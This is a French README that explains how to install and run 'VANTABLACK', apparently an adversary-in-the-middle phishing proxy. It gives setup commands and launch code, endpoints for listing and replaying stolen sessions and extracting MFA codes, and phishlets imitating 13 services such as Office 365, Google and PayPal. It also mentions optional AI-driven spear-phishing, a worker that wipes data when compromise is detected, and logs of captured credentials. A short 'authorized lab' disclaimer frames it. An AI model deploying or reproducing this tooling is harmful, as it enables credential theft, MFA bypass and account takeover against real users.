# Lancement de VANTABLACK en labo (état actuel)

> **Cadre** : ce document décrit comment démarrer l'environnement de
> **recherche en sécurité autorisé** (labo isolé, pentest contractuel,
> red team engagement). Aucune cible tierce n'est à toucher.

## 1. Prérequis

- Python 3.11+ (testé avec **3.14.2** sur macOS Homebrew)
- `git`
- (Optionnel) Redis si vous voulez activer les workers Celery
- (Optionnel) Ollama + modèle llama3 pour le spear-phishing IA

## 2. Installation (one-shot)

```bash
# 1) Cloner
git clone https://github.com/thesenegalesehitch/Vantablack-evilginx-core-.git
cd Vantablack-evilginx-core-

# 2) Créer un venv (recommandé sur macOS/Linux PEP 668)
python3 -m venv .venv
source .venv/bin/activate

# 3) Installer les dépendances minimales pour faire tourner le proxy
pip install httpx fastapi uvicorn pyyaml rich colorama requests psutil

# 4) Pour Pydantic v2 (>=2.0) : pydantic-settings est requis
pip install pydantic-settings
```

> Si vous utilisez Pydantic 1.10.x, `core/config.py` bascule
> automatiquement en mode legacy — pas besoin de pydantic-settings.

## 3. Lancement du proxy AiTM

```bash
source .venv/bin/activate
python -c "
from core.proxy import AdvancedRedTeamProxy
from core.config import Settings
proxy = AdvancedRedTeamProxy(Settings.from_env())
proxy.start(block=False)   # mode arrière-plan
"
```

Le proxy écoute sur **`0.0.0.0:8080`** par défaut. Pour changer :

```bash
export PROXY_HOST=127.0.0.1
export PROXY_PORT=9090
```

## 4. Endpoints exposés

| Méthode | Chemin | Rôle |
| --- | --- | --- |
| `GET` | `/_/sessions` | Liste des sessions volées (id uniquement) |
| `GET` | `/_/session/{id}` | Détail d'une session (cookies, headers, IP) |
| `POST` | `/_/session/replay/{id}?target_url=…` | Rejeu de session |
| `POST` | `/_/mfa/intercept?content=…&content_type=…` | Extraction de codes MFA |

## 5. Test end-to-end

Un script de validation est fourni :

```bash
source .venv/bin/activate
python test_e2e.py
```

Sortie attendue (extrait) :

```
[1/4] Proxy instancié sur le port 8080
[2/4] Proxy démarré en arrière-plan
[3/4] GET /            -> 404
[4/4] GET /_/sessions  -> 200 body={"count":0,"sessions":[]}
[+]   POST /_/mfa/intercept -> 200 body={"intercepted_codes":["123456"]}
TEST E2E RÉUSSI ✅
```

## 6. Phishlets

Les phishlets YAML sont dans `phishlets/`. Sélection par variable d'env :

```bash
export PHISHLET_PATH=/Users/pro/SaaS/Vantablack/phishlets/o365.yaml
```

Liste actuelle : `o365`, `google`, `twitter`, `amazon`, `dropbox`,
`facebook`, `instagram`, `linkedin`, `paypal`, `tiktok`, `gmail_advanced`,
`office365_advanced`, etc. (13 phishlets).

## 7. Prochaines étapes (roadmap)

| Priorité | Tâche | Statut |
| --- | --- | --- |
| 🔴 | Corriger les imports cassés de `main.py` | ✅ FAIT |
| 🔴 | Rendre `core.config` indépendant de pydantic | ✅ FAIT |
| 🔴 | Wrapper `AdvancedRedTeamProxy` avec start/stop | ✅ FAIT |
| 🟠 | Faire tourner `python main.py` (CLI interactive) | 🔄 À tester |
| 🟠 | Activer Redis + workers Celery | ⏳ |
| 🟡 | Module **Blue Team** (détection AiTM : JA3/JA4, cert. pinning, anomalie IP) | ⏳ Phase 2 |
| 🟢 | Déploiement WAN (Terraform + WireGuard) | ⏳ |

## 8. Notes de sécurité (labo)

- **Toujours** tourner dans un VLAN isolé / VM jetable.
- **Ne jamais** réutiliser les clés du fichier `.env` en production.
- Le `Ghost Protocol` (workers/ghost_protocol_worker.py) efface Redis
  en cas de détection de compromission.
- Les logs `vanta.log` contiennent les credentials capturés : à chiffrer
  au repos (LUKS / FileVault).
